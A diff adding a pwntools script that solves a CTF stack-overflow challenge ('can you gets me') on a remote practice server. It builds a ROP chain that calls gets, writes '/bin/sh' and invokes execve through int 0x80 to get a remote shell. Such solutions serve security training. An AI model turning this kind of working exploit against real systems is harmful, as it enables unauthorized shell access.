@@ -1,0 +1,19 @@
+from pwn import *                                                                                                                                                                                                                                                                                                                                                                                                 
+#sh = process("./picoctf_2018_can_you_gets_me")                                                                                                                                                            
+sh = remote("node4.buuoj.cn","28138")                                                                                                                                                                      
+
+int_addr = 0x0806cc25                                                                                                                                                                                      
+pop_eax = 0x080b81c6                                                                                                                                                                                       
+pop_ebx = 0x080481c9                                                                                                                                                                                       
+pop_ecx = 0x080de955                                                                                                                                                                                       
+pop_edx = 0x0806f02a                                                                                                                                                                                       
+writebleAddr = 0x80e9000                                                                                                                                                                                   
+getsAddr = 0x0804F120                                                                                                                                                                                      
+                                                                                                                                                                                                           
+payload = 'a'*0x18 + 'b'*4 + p32(getsAddr) + p32(pop_eax) + p32(writebleAddr) + p32(pop_eax) + p32(0x0b) + p32(pop_ebx) + p32(writebleAddr) + p32(pop_ecx) + p32(0) + p32(pop_edx) + p32(0) + p32(int_addr)
+                                                                                                                                                                                                           
+sh.recvuntil("GIVE ME YOUR NAME!")                                                                                                                                                                         
+sh.sendline(payload)                                                                                                                                                                                       
+                                                                                                                                                                                                           
+sh.sendline("/bin/sh\x00")                                                                                                                                                                                 
+sh.interactive()
